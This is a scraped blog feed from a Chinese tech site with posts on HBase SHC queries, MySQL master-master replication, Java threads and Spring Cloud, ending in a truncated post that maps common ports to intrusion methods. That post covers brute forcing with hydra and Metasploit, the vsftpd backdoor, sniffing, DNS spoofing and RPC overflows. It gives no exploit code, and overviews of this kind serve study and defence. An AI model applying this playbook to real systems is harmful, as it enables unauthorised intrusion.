&quot;``type``&quot;:&quot;``double``&quot;&#125;,`` ``|&quot;``col``3``&quot;:&#123;&quot;``cf``&quot;:&quot;``cf``3``&quot;, &quot;``col``&quot;:&quot;``col``3``&quot;, &quot;``type``&quot;:&quot;``float``&quot;&#125;,`` ``|&quot;``col``4``&quot;:&#123;&quot;``cf``&quot;:&quot;``cf``4``&quot;, &quot;``col``&quot;:&quot;``col``4``&quot;, &quot;``type``&quot;:&quot;``int``&quot;&#125;,`` ``|&quot;``col``5``&quot;:&#123;&quot;``cf``&quot;:&quot;``cf``5``&quot;, &quot;``col``&quot;:&quot;``col``5``&quot;, &quot;``type``&quot;:&quot;``bigint``&quot;&#125;,`` ``|&quot;``col``6``&quot;:&#123;&quot;``cf``&quot;:&quot;``cf``6``&quot;, &quot;``col``&quot;:&quot;``col``6``&quot;, &quot;``type``&quot;:&quot;``smallint``&quot;&#125;,`` ``|&quot;``col``7``&quot;:&#123;&quot;``cf``&quot;:&quot;``cf``7``&quot;, &quot;``col``&quot;:&quot;``col``7``&quot;, &quot;``type``&quot;:&quot;``string``&quot;&#125;,`` ``|&quot;``col``8``&quot;:&#123;&quot;``cf``&quot;:&quot;``cf``8``&quot;, &quot;``col``&quot;:&quot;``col``8``&quot;, &quot;``type``&quot;:&quot;``tinyint``&quot;&#125;`` ``|&#125;`` ``|&#125;&quot;``&quot;&quot;``.stripMargin` 上面的 col00 和 col01 两列组合成一个 rowkey，并且 col00 排在前面，col01 排在后面。比如 col00 =’row002’，col01 = 2，那么组合的 rowkey 为 row002\\x00\\x00\\x00\\x02。那么在组合 Rowkey 的查询 shc 都有哪些优化呢？现在我们有如下查询 1`df.sqlContext.sql(``&quot;select col00, col01, col1 from iteblog where col00 = &apos;row000&apos; and col01 = 0&quot;``).show()` 根据上面的信息，RowKey 其实是由 col00 和 col01 组合而成的，那么上面的查询其实可以将 col00 和 col01 进行拼接，然后组合成一个 RowKey，然后上面的查询其实可以转换成一个 Get 查询。但是在 shc 里面，上面的查询是转换成一个 scan 和一个 get 查询的。scan 的 startRow 为 row000，endRow 为 row000\\xff\\xff\\xff\\xff；get 的 rowkey 为 row000\\xff\\xff\\xff\\xff，然后再将所有符合条件的数据返回，最后再在 Spark 层面上做一次过滤，得到最后查询的结果。因为 shc 里面组合键查询的代码还没完善，所以当前实现应该不是最终的。 在 shc 里面下面两条 SQL 查询下沉到 HBase 的逻辑一致 1`df.sqlContext.sql(``&quot;select col00, col01, col1 from iteblog where col00 = &apos;row000&apos;&quot;``).show()``df.sqlContext.sql(``&quot;select col00, col01, col1 from iteblog where col00 = &apos;row000&apos; and col01 = 0&quot;``).show()` 唯一区别是在 Spark 层面上的过滤。 scan 查询优化如果我们的查询有 &lt; 或 &gt; 等查询过滤条件，比如下面的查询条件： 1`df.sqlContext.sql(``&quot;select col00, col01, col1 from iteblog where col00 &gt; &apos;row000&apos; and col00 &lt; &apos;row005&apos;&quot;``).show()` 这个在 shc 里面转换成 HBase 的过滤为一条 get 和 一个 scan，具体为 get 的 Rowkey 为 row0005\\xff\\xff\\xff\\xff；scan 的 startRow 为 row000，endRow 为 row005\\xff\\xff\\xff\\xff，然后将查询的结果返回到 spark 层面上进行过滤。 总体来说，shc 能在一定程度上对查询进行优化，避免了全表扫描。但是经过评测，shc 其实还有很多地方不够完善，算子下沉并没有下沉到 HBase 层面上进行。目前这个项目正在和 hbase 自带的 connectors 进行整合","categories":[{"name":"HBase","slug":"HBase","permalink":"https://www.5658.pw/categories/HBase/"}],"tags":[{"name":"HBase","slug":"HBase","permalink":"https://www.5658.pw/tags/HBase/"},{"name":"Sql","slug":"Sql","permalink":"https://www.5658.pw/tags/Sql/"},{"name":"SHC","slug":"SHC","permalink":"https://www.5658.pw/tags/SHC/"}]},{"title":"Centos7 mysql 5.6 数据库主主复制","slug":"Centos7-mysql-5-6-数据库主主复制","date":"2019-03-25T02:16:44.000Z","updated":"2019-05-11T05:57:20.912Z","comments":true,"path":"2019/03/25/Centos7-mysql-5-6-数据库主主复制/","link":"","permalink":"https://www.5658.pw/2019/03/25/Centos7-mysql-5-6-数据库主主复制/","excerpt":"主机系统是：centos7.4 64位 内存：2G CPU:4核心 安装Mysql docker pull mysql","text":"主机系统是：centos7.4 64位 内存：2G CPU:4核心 安装Mysql docker pull mysql主的配置文件 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102[client]#password = your_passwordport = 3306socket = /tmp/mysql.sock[mysqld]binlog_cache_size = 64Kthread_stack = 256Kjoin_buffer_size = 1024Kquery_cache_type = 1max_heap_table_size = 128Mport = 3306socket = /tmp/mysql.sockdatadir = /www/server/dataskip-external-lockingperformance_schema_max_table_instances=400table_definition_cache=400key_buffer_size = 128Mmax_allowed_packet = 100Gtable_open_cache = 128sort_buffer_size = 768Knet_buffer_length = 8Kread_buffer_size = 768Kread_rnd_buffer_size = 512Kmyisam_sort_buffer_size = 8Mthread_cache_size = 64query_cache_size = 128Mtmp_table_size = 128Mexplicit_defaults_for_timestamp = true#skip-networking#skip-name-resolvemax_connections = 100max_connect_errors = 100open_files_limit = 65535sql-mode=NO_ENGINE_SUBSTITUTION,STRICT_TRANS_TABLESlog-bin=mysql-binbinlog_format=mixedserver-id = 1expire_logs_days = 10slow_query_log=1slow-query-log-file=/www/server/data/mysql-slow.loglong_query_time=3#log_queries_not_using_indexes=on#loose-innodb-trx=0#loose-innodb-locks=0#loose-innodb-lock-waits=0#loose-innodb-cmp=0#loose-innodb-cmp-per-index=0#loose-innodb-cmp-per-index-reset=0#loose-innodb-cmp-reset=0#loose-innodb-cmpmem=0#loose-innodb-cmpmem-reset=0#loose-innodb-buffer-page=0#loose-innodb-buffer-page-lru=0#loose-innodb-buffer-pool-stats=0#loose-innodb-metrics=0#loose-innodb-ft-default-stopword=0#loose-innodb-ft-inserted=0#loose-innodb-ft-deleted=0#loose-innodb-ft-being-deleted=0#loose-innodb-ft-config=0#loose-innodb-ft-index-cache=0#loose-innodb-ft-index-table=0#loose-innodb-sys-tables=0#loose-innodb-sys-tablestats=0#loose-innodb-sys-indexes=0#loose-innodb-sys-columns=0#loose-innodb-sys-fields=0#loose-innodb-sys-foreign=0#loose-innodb-sys-foreign-cols=0default_storage_engine = InnoDBinnodb_data_home_dir = /www/server/datainnodb_data_file_path = ibdata1:10M:autoextendinnodb_log_group_home_dir = /www/server/datainnodb_buffer_pool_size = 256Minnodb_log_file_size = 64Minnodb_log_buffer_size = 368Minnodb_flush_log_at_trx_commit = 1innodb_lock_wait_timeout = 120innodb_max_dirty_pages_pct = 90innodb_read_io_threads = 1innodb_write_io_threads = 1[mysqldump]quickmax_allowed_packet = 16M[mysql]no-auto-rehash[myisamchk]key_buffer_size = 32Msort_buffer_size = 768Kread_buffer = 2Mwrite_buffer = 2M[mysqlhotcopy]interactive-timeout 从节点一抹一样只是Server_id 修改了一下而已 在主备份一下数据库。全备吧。这样也就行 1#mysqldump –uroot –p’123456’ --all-databases &gt;liang.sql scp 发送到对端服务器 从服务器把文件导入进去 1mysql –uroot –p’123456’ &lt;liang.sql 进入主服务器。添加一个用户授权 1mysql&gt;grant replication slave on *.* to rep@'192.168.132.%' identified by '123456'; 这里给主服务器锁表 12mysql&gt; flush tables with read lock;Query OK, 0 rows affected (0.08 sec) 查看一下用户 1mysql&gt; select user,host from mysql.user; 后面show master 现在在从服务器操作 12345678910111213在salves实例中操作Mysql&gt;start slave ##########开启主从复制开关mysql&gt; CHANGE MASTER TO -&gt; MASTER_HOST='192.168.132.139', -&gt; MASTER_PORT=3306, -&gt; MASTER_USER='rep', -&gt; MASTER_PASSWORD='123456', -&gt; MASTER_LOG_FILE='mysql-bin.000002',-&gt; MASTER_LOG_POS=120;Mysql&gt;start slave ##########开启主从复制开关查看slave 的一个状态 mysql&gt; show slave status\\G; 这两个都为yes时候表示是已经成功了 测试是否同步成功了。我在matsrt中新建一个数据库看看salave是否能同步成功。 我在master中新建了一个aa数据库，现在查看一下salves是否同步了 同步完之后，然后就设置从服务器为主节点 首先给从服务器锁表 12mysql&gt; flush tables with read lock;Query OK, 0 rows affected (0.08 sec) 查看master status 然后从节点也是一样的 12345678910111213在salves实例中操作Mysql&gt;start slave ##########开启主从复制开关mysql&gt; CHANGE MASTER TO -&gt; MASTER_HOST='192.168.132.139', -&gt; MASTER_PORT=3306, -&gt; MASTER_USER='rep', -&gt; MASTER_PASSWORD='123456', -&gt; MASTER_LOG_FILE='mysql-bin.000002',-&gt; MASTER_LOG_POS=120;Mysql&gt;start slave ##########开启主从复制开关查看slave 的一个状态 mysql&gt; show slave status\\G; 然后查看到两个yes 就在两边自己新建数据库看看看","categories":[{"name":"Mysql","slug":"Mysql","permalink":"https://www.5658.pw/categories/Mysql/"},{"name":"Linux","slug":"Mysql/Linux","permalink":"https://www.5658.pw/categories/Mysql/Linux/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://www.5658.pw/tags/Linux/"},{"name":"Centos","slug":"Centos","permalink":"https://www.5658.pw/tags/Centos/"},{"name":"Mysql","slug":"Mysql","permalink":"https://www.5658.pw/tags/Mysql/"},{"name":"数据库","slug":"数据库","permalink":"https://www.5658.pw/tags/数据库/"}]},{"title":"在Java中怎样实现多线程？Java线程的四种状态","slug":"在Java中怎样实现多线程？Java线程的四种状态","date":"2019-01-24T10:18:29.000Z","updated":"2019-01-25T10:34:35.904Z","comments":true,"path":"2019/01/24/在Java中怎样实现多线程？Java线程的四种状态/","link":"","permalink":"https://www.5658.pw/2019/01/24/在Java中怎样实现多线程？Java线程的四种状态/","excerpt":"一、在java中怎样实现多线程？extends Thread implement Runnable 方法一：继承 Thread 类，覆盖方法 run()，我们在创建的 Thread 类的子类中重写 run() ,加入线程所要执行的代码即可。 下面是一个例子：","text":"一、在java中怎样实现多线程？extends Thread implement Runnable 方法一：继承 Thread 类，覆盖方法 run()，我们在创建的 Thread 类的子类中重写 run() ,加入线程所要执行的代码即可。 下面是一个例子： 1234567891011121314151617181920212223242526272829303132333435363738394041public class MyThread extends Thread &#123; int count= 1, number; public MyThread(int num) &#123; number = num; System.out.println (&quot;创建线程 &quot; + number); &#125; public void run() &#123; while(true) &#123; System.out.println (&quot;线程 &quot; + number + &quot;:计数 &quot; + count); if(++count== 6) return; &#125; &#125; public static void main(String args[]) &#123; for(int i = 0;i 〈 5; i++) new MyThread(i+1).start(); &#125; &#125; 这种方法简单明了，符合大家的习惯，但是，它也有一个很大的缺点，那就是如果我们的类已经从一个类继承（如小程序必须继承自 Applet 类），则无法再继承 Thread 类，这时如果我们又不想建立一个新的类，应该怎么办呢？ 我们不妨来探索一种新的方法：我们不创建Thread类的子类，而是直接使用它，那么我们只能将我们的方法作为参数传递给 Thread 类的实例，有点类似回调函数。但是 Java 没有指针，我们只能传递一个包含这个方法的类的实例。 那么如何限制这个类必须包含这一方法呢？当然是使用接口！（虽然抽象类也可满足，但是需要继承，而我们之所以要采用这种新方法，不就是为了避免继承带来的限制吗？） Java 提供了接口 java.lang.Runnable 来支持这种方法。 方法二：实现 Runnable 接口Runnable接口只有一个方法run()，我们声明自己的类实现Runnable接口并提供这一方法，将我们的线程代码写入其中，就完成了这一部分的任务。但是Runnable接口并没有任何对线程的支持，我们还必须创建Thread类的实例，这一点通过Thread类的构造函数 public Thread(Runnable target);来实现。下面是一个例子： 12345678910111213141516171819202122232425262728293031323334353637383940414243public class MyThread implements Runnable &#123; int count= 1, number; public MyThread(int num) &#123; number = num; System.out.println(&quot;创建线程 &quot; + number); &#125; public void run() &#123; while(true) &#123; System.out.println (&quot;线程 &quot; + number + &quot;:计数 &quot; + count); if(++count== 6) return; &#125; &#125; public static void main(String args[]) &#123; for(int i = 0; i 〈 5;i++) new Thread(new MyThread(i+1)).start(); &#125; &#125; 严格地说，创建Thread子类的实例也是可行的，但是必须注意的是，该子类必须没有覆盖 Thread 类的 run 方法，否则该线程执行的将是子类的 run 方法，而不是我们用以实现Runnable 接口的类的 run 方法，对此大家不妨试验一下。 使用 Runnable 接口来实现多线程使得我们能够在一个类中包容所有的代码，有利于封装，它的缺点在于，我们只能使用一套代码，若想创建多个线程并使各个线程执行不同的代码，则仍必须额外创建类，如果这样的话，在大多数情况下也许还不如直接用多个类分别继承 Thread 来得紧凑。 综上所述，两种方法各有千秋，大家可以灵活运用。 下面让我们一起来研究一下多线程使用中的一些问题。 二、线程的四种状态\\1. 新状态：线程已被创建但尚未执行（start() 尚未被调用）。 \\2. 可执行状态：线程可以执行，虽然不一定正在执行。CPU 时间随时可能被分配给该线程，从而使得它执行。 \\3. 死亡状态：正常情况下 run() 返回使得线程死亡。调用 stop()或 destroy() 亦有同样效果，但是不被推荐，前者会产生异常，后者是强制终止，不会释放锁。 \\4. 阻塞状态：线程不会被分配 CPU 时间，无法执行。 三、线程的优先级线程的优先级代表该线程的重要程度，当有多个线程同时处于可执行状态并等待获得 CPU 时间时，线程调度系统根据各个线程的优先级来决定给谁分配 CPU 时间，优先级高的线程有更大的机会获得 CPU 时间，优先级低的线程也不是没有机会，只是机会要小一些罢了。","categories":[{"name":"Java","slug":"Java","permalink":"https://www.5658.pw/categories/Java/"}],"tags":[{"name":"Java","slug":"Java","permalink":"https://www.5658.pw/tags/Java/"},{"name":"多线程","slug":"多线程","permalink":"https://www.5658.pw/tags/多线程/"}]},{"title":"SpringCloud初步介绍","slug":"SpringCloud初步介绍","date":"2019-01-23T10:04:03.000Z","updated":"2019-01-25T10:20:37.490Z","comments":true,"path":"2019/01/23/SpringCloud初步介绍/","link":"","permalink":"https://www.5658.pw/2019/01/23/SpringCloud初步介绍/","excerpt":"什么是微服务​ 就目前而言，对于微服务业界并没有一个统一的、标准的定义。 但通常而言，微服务架构是一种架构模式或者说是一种架构风格，提倡将单一应用程序划分成一组小的服务，每个服务运行其独立的自己的 进程 中，服务之前相互协调、互相配合，为用户提供最终价值。服务之前采用轻量级的通信机制互相沟通(通常是基于HTTP的RestFul API)。每个服务都围绕着具体业务进行构建，并且能够独立地部署到生产环境，选择合适的语言，工具对其进行构建，可以有一个非常轻量级的集中式管理来协调这些服务，可以使用不同的语言来编写服务，也可以使用不同的数据存储。 从技术角度理解：微服务化的核心就是将传统的一站式应用，根据业务拆分成一个一个的服务，彻底地去耦合，每一个微服务提供单一业务功能的服务，一个服务做一件事，从技术角度看就是一种小而独立的处理过程，类似进程的概念，能够自行单独启动或销毁，拥有自己独立的数据库。","text":"什么是微服务​ 就目前而言，对于微服务业界并没有一个统一的、标准的定义。 但通常而言，微服务架构是一种架构模式或者说是一种架构风格，提倡将单一应用程序划分成一组小的服务，每个服务运行其独立的自己的 进程 中，服务之前相互协调、互相配合，为用户提供最终价值。服务之前采用轻量级的通信机制互相沟通(通常是基于HTTP的RestFul API)。每个服务都围绕着具体业务进行构建，并且能够独立地部署到生产环境，选择合适的语言，工具对其进行构建，可以有一个非常轻量级的集中式管理来协调这些服务，可以使用不同的语言来编写服务，也可以使用不同的数据存储。 从技术角度理解：微服务化的核心就是将传统的一站式应用，根据业务拆分成一个一个的服务，彻底地去耦合，每一个微服务提供单一业务功能的服务，一个服务做一件事，从技术角度看就是一种小而独立的处理过程，类似进程的概念，能够自行单独启动或销毁，拥有自己独立的数据库。 论文网址 说明： spring Cloud 使用RESTful API 实现服务之间通信 dubbo 使用RPC 实现服务之间通信 微服务与微服务构架微服务 强调的是服务的大小，它关注的是某一个点，是具体解决某一个问题/提供落地对应服务的一个服务应用。 狭义的看，可以看作是要个项目里面的一个个微服务工作/Module 微服务构架 微服务构架 是一种架构模式，它提倡将单一应用程序划分成一组小的服务，服务之间互相协调，互相配合，为用户提供最终价值。每个服务运行在其 独立的进程中，服务与服务间采用轻量级的通信机制互相协作(通常是基于HTTP协议的RestFul API)。每个服务都围绕着具体业务进行构建，并且能够被独立的部署到生产环境、类生产环境等。另外，应当尽量避免统一的、集中式的服务管理机制，对具体的一个服务而言，应根据业务上下文，选择合适的语言、工具对其进行构建。 微服务优缺点优点 1).每个服务足够内聚，足够小，代码容易理解这样能聚焦一个指定的业务功能或业务需求。 2).开发简单，开发效率提高，一个服务可能就是专一的只干一件事。 3).微服务能够被小团队开发，这个团队可以是2到5个开发人员组成。 4).微服务是松耦合的，是有功能意义的服务，无论是在开发阶段或部署阶段都是独立的。 5).微服务能使用不同的语言开发。 6).易于第三方集成，微服务允许容易且灵活的方式集成自动部署，通过持续集成集成工具，如Jenkins、Hudson等。 7).微服务易于被一个开发人员理解，修改和维护，这样小团队能够更关注自己的工作成果。无需通过合作体现价值。 8).微服务允许你融合最新技术。 9).微服务只是业务逻辑代码，不会和HTML和CSS其他界面组件混合。 10).每个微服务都有自己的存储能力，可以有自己的数据库，也可以由统一的数据库。 缺点 1).开发人员要处理分布式系统的复杂性 2).多服务运维难度，随着服务的增加，运维的压力也在增大 3).系统部署依赖 4).服务间通信成本 5).系统集成测试 6).性能监控 7).数据一致性。 微服务之间是如何独立通讯的？ 微服务技术栈有哪些 微服务条目 落地的技术 服务开发 SpringBoot、Spring、SpringMVC 服务配置管理 Netfilx公司的Archaius、阿里的Diamond等 服务注册与发现 Eureka、Consul、Zookeeper 服务调用 RPC、Rest、gRPC 服务熔断器 Hystrix、Envoy等 负载均衡 Nginx、Ribbon 服务接口调用 （客户端调用服务的简化工具） Feign等 消息队列 Kafka、RabbitMQ、ActiveMQ等 服务配置中心配置管理 SpringCloudConfig、Chef等 服务路由 （API网关） Zuul等 服务监控 Zabbix、Naggios、Metrics、Spectator等 全链路追踪 Zipkin、Brave、Dapper等 服务部署 Docker、OpenStack、Kubernetes等 数据流操作 发包 SpringCloud Stream 事件消息总线 Spring Cloud Bus SpringCloud是什么官网说明： SpringCloud，基于SpringBoot 提供的一套微服务解决方案，包括服务注册与发现，配置中心，全链路监控，服务网关，负载均衡，熔断器等组件，除了基于NetFlix的开源组件做高度抽象封装之外，还有一些选型中立的开源组件。 SpringCLoud利用SpringBoot的开发便利性巧妙的简化了分布式系统基础设施的开发，SpringCloud为开发人员提供了快速构建分布式系统的一些工具，包括配置管理、服务发现、断路器、路由、微代理、事件总线、全局锁、决策竞选、分布式会话等。它们都可以用SpringBoot的开发风格做到一键启动和部署。 Spring Boot -&gt; J2EE一站式解决方案 Spring Cloud -&gt; 分布式整体解决方案 为什么选择SpringCloud作为微服务架构1.选型依据​ 1).整体解决方案和框架成熟度​ 2).社区热度​ 3).可维护度​ 4).学习曲线 2.各微服务框架的对比 SpringBoot和SpringCloud！！ 1).SpringBoot专注于快速方便的开发单个个体微服务。 2).SpringCloud是关注全局的微服务协调、整理、治理的框架，它将SpringBoot开发的单体整合并管理起来。 3).SpringBoot可以离开SpringCloud独立使用开发项目，但是 SpringCloud离不开SpringBoot，属于依赖关系。 SpringBoot专注于快速，方便的开发单个微服务个休，SpringCloud关注全局的服务治理框架 springCloud和Dubbo！！！ Dubbo SpringCloud 服务注册中心 Zookeeper Eureka 服务调用方式 RPC REST API 服务监控 Dubbo-monitor Spring BootAdmin 断路器 不完善 Spring Cloud Netflix Hystrix 服务网关 无 Spring Cloud Netflix Zuul 分布式配置 无 Spring Cloud Config 服务跟踪 无 Spring Cloud Sleuth 消息总线 无 Spring Cloud Bus 数据流 无 Spring Cloud Stream 批量任务 无 Spring Cloud Task 目前成熟的互联网框架(分布式+服务治理Dubbo) 最大区别：SpringCloud抛弃了Dubbo的RPC通信，采用的是基于HTTP的REST方式。 总体来说，两者各有优势。虽说后者服务调用的功能，但也避免了上面提到的原生RPC带来的问题。而且REST相比RPC更为灵活，服务提供方和调用方的依赖只依靠一纸契约，不存在代码级别的依赖，这在强调快速演化的微服务环境下，显得更加合适。","categories":[{"name":"Java","slug":"Java","permalink":"https://www.5658.pw/categories/Java/"}],"tags":[{"name":"Java","slug":"Java","permalink":"https://www.5658.pw/tags/Java/"},{"name":"SpringCloud","slug":"SpringCloud","permalink":"https://www.5658.pw/tags/SpringCloud/"},{"name":"微服务","slug":"微服务","permalink":"https://www.5658.pw/tags/微服务/"}]},{"title":"黑客常用端口利用总结","slug":"黑客常用端口利用总结","date":"2019-01-11T04:55:05.000Z","updated":"2019-05-11T05:43:01.211Z","comments":true,"path":"2019/01/11/黑客常用端口利用总结/","link":"","permalink":"https://www.5658.pw/2019/01/11/黑客常用端口利用总结/","excerpt":"端口 服务 入侵方式 21 ftp/tftp/vsftpd文件传输协议 爆破/嗅探/溢出/后门 22 ssh远程连接 爆破/openssh漏洞 23 Telnet远程连接 爆破/嗅探/弱口令 25 SMTP邮件服务 邮件伪造 53 DNS域名解析系统 域传送/劫持/缓存投毒/欺骗 67/68 dhcp服务 劫持/欺骗 110 pop3 爆破/嗅探 139 Samba服务 爆破/未授权访问/远程命令执行 143 Imap协议 爆破 161 SNMP协议 爆破/搜集目标内网信息 389 Ldap目录访问协议 注入/未授权访问/弱口令 445 smb ms17-010/端口溢出 512/513/514 Linux Rexec服务 爆破/Rlogin登陆 873 Rsync服务 文件上传/未授权访问 1080 socket 爆破 1352 Lotus domino邮件服务 爆破/信息泄漏 1433 mssql 爆破/注入/SA弱口令 1521 oracle 爆破/注入/TNS爆破/反弹shell 2049 Nfs服务 配置不当 2181 zookeeper服务 未授权访问 2375 docker remote api 未授权访问 3306 mysql 爆破/注入 3389 Rdp远程桌面链接 爆破/shift后门 4848 GlassFish控制台 爆破/认证绕过 5000 sybase/DB2数据库 爆破/注入/提权 5432 postgresql 爆破/注入/缓冲区溢出 5632 pcanywhere服务 抓密码/代码执行 5900 vnc 爆破/认证绕过 6379 Redis数据库 未授权访问/爆破 7001/7002 weblogic java反序列化/控制台弱口令 80/443 http/https web应用漏洞/心脏滴血 8069 zabbix服务 远程命令执行/注入 8161 activemq 弱口令/写文件 8080/8089 Jboss/Tomcat/Resin 爆破/PUT文件上传/反序列化 8083/8086 influxDB 未授权访问 9000 fastcgi 远程命令执行 9090 Websphere控制台 爆破/java反序列化/弱口令 9200/9300 elasticsearch 远程代码执行 11211 memcached 未授权访问 27017/27018 mongodb 未授权访问/爆破","text":"端口 服务 入侵方式 21 ftp/tftp/vsftpd文件传输协议 爆破/嗅探/溢出/后门 22 ssh远程连接 爆破/openssh漏洞 23 Telnet远程连接 爆破/嗅探/弱口令 25 SMTP邮件服务 邮件伪造 53 DNS域名解析系统 域传送/劫持/缓存投毒/欺骗 67/68 dhcp服务 劫持/欺骗 110 pop3 爆破/嗅探 139 Samba服务 爆破/未授权访问/远程命令执行 143 Imap协议 爆破 161 SNMP协议 爆破/搜集目标内网信息 389 Ldap目录访问协议 注入/未授权访问/弱口令 445 smb ms17-010/端口溢出 512/513/514 Linux Rexec服务 爆破/Rlogin登陆 873 Rsync服务 文件上传/未授权访问 1080 socket 爆破 1352 Lotus domino邮件服务 爆破/信息泄漏 1433 mssql 爆破/注入/SA弱口令 1521 oracle 爆破/注入/TNS爆破/反弹shell 2049 Nfs服务 配置不当 2181 zookeeper服务 未授权访问 2375 docker remote api 未授权访问 3306 mysql 爆破/注入 3389 Rdp远程桌面链接 爆破/shift后门 4848 GlassFish控制台 爆破/认证绕过 5000 sybase/DB2数据库 爆破/注入/提权 5432 postgresql 爆破/注入/缓冲区溢出 5632 pcanywhere服务 抓密码/代码执行 5900 vnc 爆破/认证绕过 6379 Redis数据库 未授权访问/爆破 7001/7002 weblogic java反序列化/控制台弱口令 80/443 http/https web应用漏洞/心脏滴血 8069 zabbix服务 远程命令执行/注入 8161 activemq 弱口令/写文件 8080/8089 Jboss/Tomcat/Resin 爆破/PUT文件上传/反序列化 8083/8086 influxDB 未授权访问 9000 fastcgi 远程命令执行 9090 Websphere控制台 爆破/java反序列化/弱口令 9200/9300 elasticsearch 远程代码执行 11211 memcached 未授权访问 27017/27018 mongodb 未授权访问/爆破 21端口渗透剖析** FTP通常用作对远程服务器进行管理，典型应用就是对web系统进行管理。一旦FTP密码泄露就直接威胁web系统安全，甚至黑客通过提权可以直接控制服务器。这里剖析渗透FTP服务器的几种方法。 1`（1）基础爆破：ftp爆破工具很多，这里我推owasp的Bruter,hydra以及msf中的ftp爆破模块。``（2) ftp匿名访问：用户名：anonymous 密码：为空或者任意邮箱``（3）后门vsftpd ：version 2到2.3.4存在后门漏洞，攻击者可以通过该漏洞获取root权限。（https:``//www.freebuf.com/column/143480.html）``（4）嗅探：ftp使用明文传输技术（但是嗅探给予局域网并需要欺骗或监听网关）,使用Cain进行渗透。``（5）ftp远程代码溢出。（https:``//blog.csdn.net/weixin_42214273/article/details/82892282）（6）ftp跳转攻击。（https://blog.csdn.net/mgxcool/article/details/48249473）` 22端口渗透剖析 SSH 是协议，通常使用 OpenSSH 软件实现协议应用。SSH 为 Secure Shell 的缩写，由 IETF 的网络工作小组（Network Working Group）所制定；SSH 为建立在应用层和传输层基础上的安全协议。SSH 是目前较可靠，专为远程登录会话和其它网络服务提供安全性的协议。利用 SSH 协议可以有效防止远程管理过程中的信息泄露问题。 1`（1）弱口令，可使用工具hydra，msf中的ssh爆破模块。``（2）防火墙SSH后门。（https:``//www.secpulse.com/archives/6.093.html）``（3）28退格 OpenSSL``（4）openssh 用户枚举 CVE-2018-15473。（https:``//www.anquanke.com/post/id/157607）` 23端口渗透剖析 telnet是一种旧的远程管理方式，使用telnet工具登录系统过程中，网络上传输的用户和密码都是以明文方式传送的，黑客可使用嗅探技术截获到此类密码。 1`（1）暴力破解技术是常用的技术，使用hydra,或者msf中telnet模块对其进行破解。``（2）在linux系统中一般采用SSH进行远程访问，传输的敏感数据都是经过加密的。而对于windows下的telnet来说是脆弱的，因为默认没有经过任何加密就在网络中进行传输。使用cain等嗅探工具可轻松截获远程登录密码。` 25/465端口渗透剖析 smtp：邮件协议，在linux中默认开启这个服务，可以向对方发送钓鱼邮件 1`默认端口：25（smtp）、465（smtps）``（1）爆破：弱口令``（2）未授权访问` 53端口渗透剖析53端口是DNS域名服务器的通信端口，通常用于域名解析。也是网络中非常关键的服务器之一。这类服务器容易受到攻击。对于此端口的渗透，一般有三种方式。 1`（1）使用DNS远程溢出漏洞直接对其主机进行溢出攻击，成功后可直接获得系统权限。（https:``//www.seebug.org/vuldb/ssvid-96718）``（2）使用DNS欺骗攻击，可对DNS域名服务器进行欺骗，如果黑客再配合网页木马进行挂马攻击，无疑是一种杀伤力很强的攻击，黑客可不费吹灰之力就控制内网的大部分主机。这也是内网渗透惯用的技法之一。（https:``//baijiahao.baidu.com/s?id=1577362432987749706&amp;wfr=spider&amp;for=pc）``（3）拒绝服务攻击，利用拒绝服务攻击可快速的导致目标服务器运行缓慢，甚至网络瘫痪。如果使用拒绝服务攻击其DNS服务器。将导致用该服务器进行域名解析的用户无法正常上网。（http:``//www.edu.cn/xxh/fei/zxz/201503/t20150305_1235269.shtml）（4）DNS劫持。（https://blog.csdn.net/qq_32447301/article/details/77542474）` 80端口渗透剖析80端口通常提供web服务。目前黑客对80端口的攻击典型是采用SQL注入的攻击方法，脚本渗透技术也是一项综合性极高的web渗透技术，同时脚本渗透技术对80端口也构成严重的威胁。 1`（1）对于windows2000的IIS5.0版本，黑客使用远程溢出直接对远程主机进行溢出攻击，成功后直接获得系统权限。``（2）对于windows2000中IIS5.0版本，黑客也尝试利用‘Microsoft IISCGI’文件名错误解码漏洞攻击。使用X-SCAN可直接探测到IIS漏洞。``（3）IIS写权限漏洞是由于IIS配置不当造成的安全问题，攻击者可向存在此类漏洞的服务器上传恶意代码，比如上传脚本木马扩大控制权限。``（4）普通的http封包是没有经过加密就在网络中传输的，这样就可通过嗅探类工具截取到敏感的数据。如使用Cain工具完成此类渗透。``（5）80端口的攻击，更多的是采用脚本渗透技术，利用web应用程序的漏洞进行渗透是目前很流行的攻击方式。``（6）对于渗透只开放80端口的服务器来说，难度很大。利用端口复用工具可解决此类技术难题。``（7）CC攻击效果不及DDOS效果明显，但是对于攻击一些小型web站点还是比较有用的。CC攻击可使目标站点运行缓慢，页面无法打开，有时还会爆出web程序的绝对路径。` 135端口渗透剖析135端口主要用于使用RPC协议并提供DCOM服务，通过RPC可以保证在一台计算机上运行的程序可以顺利地执行远程计算机上的代码；使用DCOM可以通过网络直接进行通信，能够跨包括HTTP协议在内的多种网络传输。同时这个端口也爆出过不少漏洞，最严重的就是缓冲区溢出漏洞，曾经疯狂一时的‘冲击波’病毒就是利用这个漏洞进行传播的。对于135端口的渗透，黑客的渗透方法为: 1`（1）查找存在RPC溢出的主机，进行远程溢出攻击，直接获得系统权限。如用‘DSScan’扫描存在此漏洞的主机。对存在漏洞的主机可使用‘ms05011.exe’进行溢出，溢出成功后获得系统权限。（https:``//wenku.baidu.com/view/68b3340c79563c1ec5da710a.html）``（2）扫描存在弱口令的135主机，利用RPC远程过程调用开启telnet服务并登录telnet执行系统命令。系统弱口令的扫描一般使用hydra。对于telnet服务的开启可使用工具kali链接。（https:``//wenku.baidu.com/view/c8b96ae2700abb68a982fbdf.html）` 139/445端口渗透剖析139端口是为‘NetBIOS SessionService’提供的，主要用于提供windows文件和打印机共享以及UNIX中的Samba服务。445端口也用于提供windows文件和打印机共享，在内网环境中使用的很广泛。这两个端口同样属于重点攻击对象，139/445端口曾出现过许多严重级别的漏洞。下面剖析渗透此类端口的基本思路。 